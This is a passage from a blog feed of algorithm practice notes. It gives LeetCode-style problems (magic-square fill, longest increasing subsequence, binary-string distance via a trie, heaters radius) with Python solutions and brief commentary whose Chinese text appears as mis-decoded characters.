class="built_in">max</span>(bloomDay)</span><br><span class="line">        <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">            mid = l + (r - l) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> check(mid):</span><br><span class="line">                r = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                l = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> l</span><br></pre></td></tr></table></figure></p><h2 id="fill-matrix">Fill Matrix</h2><p>Given a NxN matrix. Fill the integers from <code>1</code> to <code>n*n</code> to this matrix that makes the sum of each row, each column and the two diagonals equal.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 3</span><br><span class="line">Output:</span><br><span class="line">[[8, 3, 4],</span><br><span class="line"> [1, 5, 9],</span><br><span class="line"> [6, 7, 2]]</span><br><span class="line">Explanation: We need to fill [1, 2, 3... 9] into a 3x3 matrix. This is one way to do it</span><br><span class="line">Each row [8, 3, 4] [1, 5, 9] [6, 7, 2] sum is 15.</span><br><span class="line">Each column [8, 1, 6] [3, 5, 7] [4, 9, 2] sum is 15.</span><br><span class="line">The two diagonals [8, 5, 2] [4, 5, 6] sum is 15.</span><br></pre></td></tr></table></figure><p>åªä¼šä¸€æ‰‹çˆ†ç ´å†™æ³•,å¤æ‚åº¦é«˜äº†ç›´æ¥ä¸è¡Œ,æœ€å¤šåˆ°4. ä¼˜åŒ–æ‡’å¾—è€ƒè™‘äº†,æ„Ÿè§‰ä¸å¾—è¡Œ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_row</span>(<span class="params">board, row, n</span>):</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> board[row][i] == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        ret += board[row][i]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_col</span>(<span class="params">board, col, n</span>):</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> board[i][col] == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        ret += board[i][col]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_diagnal</span>(<span class="params">board, n, tl2br=<span class="literal">True</span></span>):</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> tl2br:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> board[i][i] == <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            ret += board[i][i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> board[i][n - i - <span class="number">1</span>] == <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            ret += board[i][n - i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fillMatrix</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">board, index, value_set, n</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(value_set) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> board</span><br><span class="line">        row = index // n</span><br><span class="line">        col = index % n</span><br><span class="line">        new_board = board.copy()</span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> value_set:</span><br><span class="line">            new_board[row][col] = value</span><br><span class="line">            new_value_set = value_set - &#123;value&#125;</span><br><span class="line">            <span class="keyword">if</span> row == n - <span class="number">1</span> <span class="keyword">or</span> col == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> row == n - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_col(new_board, col, n) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> col == n - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_row(new_board, row, n) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> row == n - <span class="number">1</span> <span class="keyword">and</span> col == n - <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_diagnal(new_board, n) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> row == n-<span class="number">1</span> <span class="keyword">and</span> col == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> check_diagnal(new_board, n, <span class="literal">False</span>) != avg:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            ret = fill(new_board, index + <span class="number">1</span>, new_value_set, n)</span><br><span class="line">            <span class="keyword">if</span> ret == -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> row == n - <span class="number">1</span> <span class="keyword">and</span> col == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> new_board</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    board = [[<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    all_value = <span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">1</span>, n**<span class="number">2</span>+<span class="number">1</span>))</span><br><span class="line">    avg = <span class="built_in">sum</span>(all_value) // n</span><br><span class="line">    ret = fill(board, <span class="number">0</span>, all_value, n)</span><br><span class="line">    <span class="keyword">if</span> ret != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line">n=<span class="number">4</span></span><br><span class="line">res = fillMatrix(n)</span><br><span class="line"><span class="keyword">if</span> res != -<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># matrix</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Matrix:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># row check</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rows:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            ret += res[i][j]</span><br><span class="line">        <span class="built_in">print</span>(ret, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># col check</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;cols:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            ret += res[j][i]</span><br><span class="line">        <span class="built_in">print</span>(ret, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tlbr diagonal:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret += res[i][i]</span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;trbl diagonal:&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ret = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        ret += res[i][n-<span class="number">1</span>-i]</span><br><span class="line">    <span class="built_in">print</span>(ret)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not Exist!&quot;</span>)</span><br></pre></td></tr></table></figure></p><h2 id="longest-increasing-subsequence">300. Longest Increasing Subsequence</h2><p>Given an integer array nums, return the length of the longest strictly increasing subsequence.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [10,9,2,5,3,7,101,18]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: The longest increasing subsequence is [2,3,7,101], therefore the length is 4.</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æ˜¯è§‰å¾—æ˜¯dp, å¤–å±‚éå†æ‰€æœ‰å…ƒç´ , å†…å±‚éå†æ‰¾æœ€é•¿è·¯å¾„, dpå…ƒç´ è¡¨ç¤ºåˆ°è¾¾æŸä¸ªindexçš„æœ€é•¿è·¯å¾„,å¤æ‚åº¦<code>O(n^2)</code>,ä½†é¢˜ç›®è¦æ±‚nlogn,æƒ³äº†åŠå¤©æ²¡æƒ³å‡ºæ¥,çœ‹äº†ä¸‹åˆ«äººçš„ç­”æ¡ˆ,ç†è§£äº†ä¹‹åè‡ªå·±å†™äº†ä¸€é. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLIS</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        lst = [nums[<span class="number">0</span>]]</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums[<span class="number">1</span>:]:</span><br><span class="line">            <span class="keyword">if</span> num &gt; lst[-<span class="number">1</span>]:</span><br><span class="line">                lst.append(num)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lst[bisect.bisect_left(lst, num)] = num</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(lst)</span><br></pre></td></tr></table></figure> ä¸»è¦å°±æ˜¯ä¸€æ—¦æ–°å…ƒç´ å¤§äºæœ€å³ä¾§å¿…ç„¶å¯¼è‡´é•¿åº¦åŠ ä¸€,å¦åˆ™å¯ä»¥ä¸¢åˆ°listé‡Œé¢å»å½“ä½œæ–°caseæ¥å‚¨å­˜,ä¸€æ—¦è¿™ä¸ªæ–°caseè¾¾åˆ°æœ€å¤§é•¿åº¦æˆ–è€…æ–°æ¥çš„å…ƒç´ å¤§äºæ‰€æœ‰å…ƒç´ éƒ½ä¼šè¢«è€ƒè™‘åˆ°,è€Œæˆ‘ä»¬å¹¶ä¸åœ¨ä¹åŸæ¥çš„listæ˜¯ä»€ä¹ˆ,æ‰€ä»¥æœ€ålistä¼šè¢«æ‰“ä¹±,ä½†æ˜¯ä¸å½±å“æœ€ç»ˆè¿”å›æ˜¯æœ€å¤§é•¿åº¦.</p><h2 id="maximum-distance">Maximum Distance</h2><p>Problem statement You are given an array of binary strings â€˜arrâ€™ of size â€˜Nâ€™. Your task is to find out the maximum distance between the pair of strings.</p><p>The distance between two binary strings is defined as the sum of their lengths after removing the common prefix.</p><p>For example: You are given â€˜arrâ€™ = [ â€œ01011â€, â€œ010110â€, â€œ0111â€], Here the strings with the maximum distance between them are â€œ010110â€ and â€œ0111â€, where the prefix is â€œ01â€, hence the maximum distance is 4 + 2 = 6. Hence the answer is 6.</p><p>ç¬¬ä¸€æ„Ÿè§‰æš´åŠ›æ±‚è§£,ç„¶åå°±å†™äº†ä¸€ä»½ç„¶åACäº†,çœ‹äº†ç­”æ¡ˆå‘ç°ç”¨trieåšçš„,ç¬¬ä¸€æ¬¡è§è¿™ä¸ªæ•°æ®ç»“æ„,ä¹Ÿç®—æ˜¯è®°ä¸€ä¸‹äº†. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># brute force</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maximumDistance</span>(<span class="params">arr: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    length = <span class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diff</span>(<span class="params">str1, str2</span>):</span><br><span class="line">        l1, l2 = <span class="built_in">len</span>(str1), <span class="built_in">len</span>(str2)</span><br><span class="line">        min_length = <span class="built_in">min</span>(l1, l2)</span><br><span class="line">        same_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> char_index <span class="keyword">in</span> <span class="built_in">range</span>(min_length):</span><br><span class="line">            <span class="keyword">if</span> str1[char_index] == str2[char_index]:</span><br><span class="line">                same_length += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> l1 + l2 - <span class="number">2</span> *same_length</span><br><span class="line"></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, length):</span><br><span class="line">            result = <span class="built_in">max</span>(result, diff(arr[i], arr[j]))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># trie</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Time Complexity: O(N*M)</span></span><br><span class="line"><span class="string">    Space Complexity: O(N*M)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Where N is the number of strings and M is the average length of each string</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrieNode</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, val</span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        self.isEnd = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to build the trie Node</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buildTree</span>(<span class="params">arr: <span class="type">List</span>[<span class="built_in">str</span>], root: TrieNode</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> currString <span class="keyword">in</span> arr:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set starting node as root</span></span><br><span class="line">        currNode = root</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(currString)):</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Get the distance of current character from the end of the string</span></span><br><span class="line">            distance = <span class="built_in">len</span>(currString) - i</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If the current character is 0 the add the distance towards the left child</span></span><br><span class="line">            <span class="keyword">if</span>(currString[i] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">not</span> currNode.left):</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># If node doesn&#x27;t exist create and add the distance of the node</span></span><br><span class="line">                    currNode.left = TrieNode(distance)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    currNode.left.val = <span class="built_in">max</span>(currNode.left.val, distance)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Move the current node towards left</span></span><br><span class="line">                currNode = currNode.left</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If the current character is 1 the add the distance towards the right child</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">not</span> currNode.right):</span><br><span class="line">                    currNode.right = TrieNode(distance)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    currNode.right.val = <span class="built_in">max</span>(currNode.right.val, distance)</span><br><span class="line">                currNode = currNode.right</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set the isEnd true for the last node in the string</span></span><br><span class="line">        currNode.isEnd= <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maximumDistance</span>(<span class="params">arr: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the current node dummy root node for the trie</span></span><br><span class="line">    root = TrieNode(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    buildTree(arr, root)</span><br><span class="line"></span><br><span class="line">    maxDistance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialise an empty queue</span></span><br><span class="line">    q = deque()</span><br><span class="line">    q.append(root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do a BFS on the trie</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(q) &gt; <span class="number">0</span>):</span><br><span class="line"></span><br><span class="line">        currNode = q.popleft()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(currNode.left <span class="keyword">or</span> currNode.right):</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If both left and right is present them the string differ from here</span></span><br><span class="line">            <span class="keyword">if</span>(currNode.left <span class="keyword">and</span> currNode.right):</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Therefore we add the distance</span></span><br><span class="line">                maxDistance = <span class="built_in">max</span>(maxDistance, currNode.left.val + currNode.right.val)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If current node is the last node of the string then only one of left or right is present</span></span><br><span class="line">            <span class="keyword">if</span>(currNode.isEnd):</span><br><span class="line">                maxDistance = <span class="built_in">max</span>(maxDistance, currNode.left.val <span class="keyword">if</span> currNode.left <span class="keyword">else</span> currNode.right.val)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(currNode.left):</span><br><span class="line">            q.append(currNode.left)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(currNode.right):</span><br><span class="line">            q.append(currNode.right)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Finally return the maxDistance</span></span><br><span class="line">    <span class="keyword">return</span> maxDistance</span><br></pre></td></tr></table></figure><h2 id="heaters">475. Heaters</h2><p>Winter is coming! During the contest, your first job is to design a standard heater with a fixed warm radius to warm all the houses.</p><p>Every house can be warmed, as long as the house is within the heater's warm radius range.</p><p>Given the positions of <code>houses</code> and <code>heaters</code> on a horizontal line, return the minimum radius standard of heaters so that those heaters could cover all houses.</p><p>Notice that all the <code>heaters</code> follow your radius standard, and the warm radius will the same.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: houses = [1,2,3,4], heaters = [1,4]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The two heaters were placed at positions 1 and 4. We need to use a radius 1 standard, then all the houses can be warmed.</span><br></pre></td></tr></table></figure><p>æ’åºåŠ äºŒåˆ†, nlogn <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findRadius</span>(<span class="params">self, houses: <span class="type">List</span>[<span class="built_in">int</span>], heaters: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        houses = <span class="built_in">sorted</span>(houses)</span><br><span class="line">        heaters = <span class="built_in">sorted</span>(heaters)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> houses:</span><br><span class="line">            nearest_index = bisect.bisect_left(heaters, i)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span>&lt;= nearest_index &lt;= <span class="built_in">len</span>(heaters) - <span class="number">1</span>:</span><br><span class="line">                res = <span class="built_in">max</span>(res, <span class="built_in">min</span>(<span class="built_in">abs</span>(heaters[nearest_index-<span class="number">1</span>]-i),<span class="built_in">abs</span>(heaters[nearest_index]-i)))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> nearest_index == <span class="number">0</span>:</span><br><span class="line">                    res = <span class="built_in">max</span>(res, <span class="built_in">abs</span>(heaters[<span class="number">0</span>]-i))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = <span class="built_in">max</span>(res, <span class="built_in">abs</span>(heaters[-<span class="number">1</span>]-i))</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç‰›å®¢å­—èŠ‚æ ·é¢˜è®°å½•</title>
      <link href="/2024/03/14/%E7%89%9B%E5%AE%A2%E5%AD%97%E8%8A%82%E6%A0%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/14/%E7%89%9B%E5%AE%A2%E5%AD%97%E8%8A%82%E6%A0%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
